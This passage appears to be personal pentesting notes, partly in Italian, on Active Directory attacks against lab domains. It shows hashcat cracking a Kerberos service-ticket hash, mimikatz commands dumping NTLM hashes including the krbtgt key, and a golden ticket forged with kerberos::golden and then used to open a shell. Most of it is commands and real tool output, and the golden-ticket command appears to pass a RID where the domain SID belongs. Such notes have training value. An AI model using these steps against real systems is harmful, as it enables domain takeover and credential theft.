Time.Estimated...: Sat Oct 03 16:54:17 2020 (3 secs)
Guess.Base.......: File (..\..\..\tmrc\hacking\wordlist\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3107.7 kH/s (11.91ms) @ Accel:256 Loops:1 Thr:64 Vec:1
Recovered........: 0/1 (0.00%) Digests
Progress.........: 4505600/14344385 (31.41%)
Rejected.........: 0/4505600 (0.00%)
Restore.Point....: 4505600/14344385 (31.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: pu960414 -> pommiey4632@hotmail.com
Hardware.Mon.#1..: Temp: 37c Fan: 30% Util: 52% Core:1071MHz Mem:2700MHz Bus:16

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5f50893874781c77ef09afc1b9ba7098$de6d1534754ae903f24d68537315fcf567b65117c4f8cd9ec9384c552a650fb4aceffe4c406f479740eeaa9b2d7c17fc9f0c5442a5bd8a931f15189bc61eb123e385fcbb84a6ae9f5a49c531a3ad5c88f27c226996987422cffc50d6934dc2ad32cda9c7bbdc4e704fc777ff4e512b03c886fdd87eacd8f9edad12bc9927f46e3a5507f989a3fee749aa6ed5c6a0528335a1b909a69a7db16cc7adadc9f959f80095e100444de02c645b0f0eb320b8d81e37305bbc7be7ef54f844430d89c271c71d52add55b0941ee8c49e520788032e85e7990d40a9462225cd35b5bfd7d8eafeeab27a305609ca2d19a09af04aaa881cc161fb2fa72abe8dabf753c793828cefb8d80691de88147a324c42186ca85f9aa284928ae7e0d341ee0dfd44d4ade7a61c6546f3564eea20dc496ec5301ea3bbe025fb83c32d9c1370ce7066f3433b7c747b1eb03f0b77788a0fc4c0c6aeb7544e0e258f70f08b6af8b0876e740d1f95017d73358771408de69b799e607b75c36b2078023a524eb929f4d9ac6396c67cfcf7cbf007e194c2830940e0fc96236f8f8ce93d3834ed76140ca389335c9a99045214f2a0c4ceeaad15c67f73b07fc5fa839e2c6d91f158e0cafe3b9e652b77b6ce20723908dfc44ef0beba2ed51cbdc05425d46dded2139b0fe2d442f0b7224b9073679fd1f3065b5b1c0b6200c45a56e8918bc38f2e89a3bae4dd9327d0cefaf3777383e592cea927865df4c4ca94a3ded16275734827d3cd5acad5ca4aba9bd4bb2030b83e165ba2ce546e5af796ca916d6115d8469149f2f42c57efc92edee78f87f4fc88194570dc18220a39c8165a9f273372f1847a782ca3f0d74a05bcd22e6275170ab246b7ff75c4ed5faa68575d42aa6e7f2929b5d72530935079a5147ae1d41c5bcda3f0048b40c1175b3827cc442358e27de80f955617296c91f5d3497081058496a53b300dd5c3411baa0d59a5b0e873569619b6119665062934ca97896732ebd3453999ce22c9ba697735230dfedf171a37a8193d6a087e9dcb980598ad061167c1ed07262742dbc1c66e611fb43d7e84091513071f84a1b979958d9fe68e2a9afb947fe32aa88916dd960cf105f487a825a8233b91bc440981305e257f465642188626307440df0867be586056fe70171f997829dbc5f56d15cfd563fa6d76aef0ea3234a391798eda106b2bc28b8498cedd2b07ce992601d99d23e82956e8c89d94678eef146b7041856ae365fd4d0d3:Ticketmaster1968
```

now you can use it with psexec

## Mimikatz

https://github.com/gentilkiwi/mimikatz

precompiled binaries:

https://github.com/gentilkiwi/mimikatz/releases/

copy to target and run:

```
C:\Users\Administrator\Downloads\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK


- sekurlsa::logonpasswords (genera un dump di tutti gli hashes presenti sul computer)
- mimikatz # lsadump::sam <- in questo caso non ha funzionato
Domain : HYDRA-PC 
SysKey : 827270d14337306a3b065a5a90ddc3ca
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)
- mimikatz # lsadump::sam /patch <- nemmeno qui
Domain : HYDRA-PC
SysKey : 827270d14337306a3b065a5a90ddc3ca
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz #

mimikatz # lsadump::lsa /patch
Domain : MARVEL / S-1-5-21-365715507-4192407378-1384770248

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 920ae267e048417fcfe00f49ecbd4b33

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 57440d9b36a3cd956fef1c2a6f866bfa

RID  : 00000450 (1104)
User : fcastle
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : tstark
LM   :
NTLM : 30931633ffe053e046c50fd826cff0e7

RID  : 00000452 (1106)
User : pparker
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000457 (1111)
User : OpvcpUyYqb
LM   :
NTLM : 4135e5b435f0eb0349a99bb693c11263

RID  : 000003e8 (1000)
User : HYDRA-PC$
LM   :
NTLM : 35635de6fa8be8a1abcd411a9e7c9934

..
..
```


Golden ticket attack

```
mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : MARVEL / S-1-5-21-365715507-4192407378-1384770248

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 57440d9b36a3cd956fef1c2a6f866bfa
    LM   :
  Hash NTLM: 57440d9b36a3cd956fef1c2a6f866bfa
    ntlm- 0: 57440d9b36a3cd956fef1c2a6f866bfa
    lm  - 0: 9418259f4f8ff7f90867486e97f59196

 * WDigest
    01  dcd4f60aca5709ce65ef68052ba8bb31
    02  24dcef73ed7b856b2170394595c9f0b5
    03  045caada2a2fed62bf9b08a446a313c4
    04  dcd4f60aca5709ce65ef68052ba8bb31
    05  24dcef73ed7b856b2170394595c9f0b5
    06  9ba0872066bff07023779dfd866bb3f3
    07  dcd4f60aca5709ce65ef68052ba8bb31
    08  5c649ae6395d41eaa993718456112d40
    09  c49afa6faae4a70a72ad3ea664f0e902
    10  97456b12024c4a3be00830f6ac40a5c3
    11  9f228e0bbc1019c323b2d30a8b68fedf
    12  c49afa6faae4a70a72ad3ea664f0e902
    13  8e5e6352851430f7cfa96baf6de74e3c
    14  9f228e0bbc1019c323b2d30a8b68fedf
    15  faf7dff11106c97a1b75abdeb2603fea
    16  22a727d4b0015ec4a2a0ed2019b5dd5b
    17  1c0caf5a7f43d7c8bfd6048651a8ae08
    18  f5dd2fddaaede165b8c96ec34d6a494d
    19  34cf0830f4b113631d218916b2152dc0
    20  09be914b4fc25693e57f4c2893c39551
    21  6900f8e8c504b1e6b325ba348d9d21eb
    22  6900f8e8c504b1e6b325ba348d9d21eb
    23  a34dffc6981842506ba9f58de66fec53
    24  f311766b36844cb396da736f08e41307
    25  647ecbc0ead539c07d569ce1901254b4
    26  2c5e2fbdcaa662505d4f39f7aa53ebe0
    27  42422148c2d6341fc5e0f866b87a513b
    28  6e71e4e559a3bd415e2bc5a26e7e85d9
    29  2b03738f467f60e61be2a813a245b83a

 * Kerberos
    Default Salt : MARVEL.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 76bcbc6df7e30e54

 * Kerberos-Newer-Keys
    Default Salt : MARVEL.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 6514fcda1fb737f3eb86fcfe087d56ad90e2c84154ceee71f01c5db839b15be7
     aes128_hmac       (4096) : 34be44ba9256d12f5d0d4e0afce97e04
      des_cbc_md5       (4096) : 76bcbc6df7e30e54

 * NTLM-Strong-NTOWF
    Random Value : bb7a3c88d6fc7b51af49d0ec36c87973

mimikatz #
```

find the domain SID: S-1-5-21-365715507-4192407378-1384770248

and the NTLM ticket kerberos: 57440d9b36a3cd956fef1c2a6f866bfa

command to run (user can be a fake one):

```
mimikatz # kerberos::golden /User:Administratorfakeuser123 /domain:marvel.local /sid:500 /ptt /krbtgt:57440d9b36a3cd956fef1c2a6f866bfa
User      : Administratorfakeuser123
Domain    : marvel.local
ServiceKey: 57440d9b36a3cd956fef1c2a6f866bfa - rc4_hmac_nt
Lifetime  : 03/10/2020 18:10:24 ; 01/10/2030 18:10:24 ; 01/10/2030 18:10:24
-> Ticket : ** Pass The Ticket **

 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administratorfakeuser123 @ marvel.local' successfully submitted for current session

mimikatz #
```

then:

```
mimikatz # misc::cmd
```

you will get a shell with that golden ticket		
